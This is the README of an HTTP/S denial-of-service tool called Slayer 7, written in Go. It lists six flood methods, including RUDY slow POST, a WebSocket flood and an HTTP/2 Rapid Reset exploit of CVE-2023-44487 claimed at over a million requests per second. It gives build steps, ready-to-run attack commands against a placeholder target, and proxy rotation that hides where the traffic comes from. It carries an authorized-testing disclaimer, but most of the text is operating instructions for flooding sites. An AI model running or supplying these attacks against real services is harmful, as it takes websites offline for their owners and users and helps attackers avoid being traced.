
# ⚔️ Slayer 7 - Application Layer Attack Suite

![Slayer 7](slayer7-banner.svg)

A high-performance, multi-method HTTP/S stress testing tool written in **Go**.
Supports both HTTP and HTTPS, multiple attack vectors, proxy rotation, and massive concurrent worker pools.

> **⚠️ Disclaimer**
> This tool is intended **only** for authorized security testing and research.
> Use **only** against systems you own or have **explicit written permission** to test.
> Unauthorized use is illegal.

---
> HTTP/2 Rapid-Reset Exploit 1M+ RPS
![Animation](https://github.com/user-attachments/assets/f33cb033-dfb6-4101-bdb5-507f2e5ad83e)

## **6 Attack Methods**
  * **HTTP GET** – Standard GET requests with configurable parameters
  * **HTTP POST** – POST requests with form data or JSON payloads
  * **HTTP/2 Rapid Reset** – Raw framer implementation of CVE-2023-44487 with HPACK encoding and batched frame writes
  * **WebSocket Flood** – WebSocket connection flood with message bombardment
  * **RUDY (Slow POST)** – Slow POST technique that drips bytes at 0.5–2.5 second intervals to hold connections open
  * **API JSON Flood** – JSON payload flood targeting REST API endpoints


## 📦 Installation

### Prerequisites

* **Go 1.21+**

### Build

```bash
go mod init slayer
go mod tidy
go build -o slayer .
```
---

## 🚀 Usage

```bash
slayer -t <url> [-m method] [-w workers] [-d duration] [-p proxyfile]
```

### Flags

| Flag | Default      | Description                             |
| ---- | ------------ | --------------------------------------- |
| `-t` | *(required)* | Target URL (e.g. `https://example.com`) |
| `-m` | `httpget`    | Attack method                           |
| `-w` | `2048`       | Number of concurrent workers            |
| `-d` | `30`         | Duration (seconds)                      |
| `-p` | *(none)*     | Proxy file path (omit for direct mode)  |

---

## 🧪 Methods

| Method       | Description                                                  |
| ------------ | ------------------------------------------------------------ |
| `httpget`    | Standard HTTP GET flood                                      |
| `httppost`   | HTTP POST with randomized form / JSON payloads               |
| `rudy`       | Slow POST — large `Content-Length`, drips bytes              |
| `apiflood`   | JSON API flood with randomized endpoints and nested payloads |
| `rapidreset` | HTTP/2 Rapid Reset (CVE-2023-44487)                          |
| `wsflood`    | WebSocket connection flood with mixed traffic                |

---
### Dependencies

```
github.com/gorilla/websocket
golang.org/x/net/http2
golang.org/x/net/http2/hpack
```

## 📚 Examples

```bash
# Basic GET flood (60s)
./slayer -t https://target.com -m httpget -d 60

# POST flood via proxies (4096 workers)
./slayer -t https://target.com -m httppost -w 4096 -d 120 -p proxies.txt

# RUDY slow POST
./slayer -t https://target.com -m rudy -w 500 -d 300

# HTTP/2 Rapid Reset via proxies
./slayer -t https://target.com -m rapidreset -w 1024 -p proxies.txt

# WebSocket flood
./slayer -t https://target.com -m wsflood -w 2048 -d 60

# API JSON flood
./slayer -t https://target.com -m apiflood -w 2048 -d 90
```

---

## 🌐 Proxy File Format

One proxy per line.
Supports HTTP / HTTPS / SOCKS5 with optional authentication.

```
http://proxy1.example.com:8080
http://user:pass@proxy2.example.com:3128
socks5://proxy3.example.com:1080
```



## 📜 License

**For authorized testing only.**
Use responsibly.

---
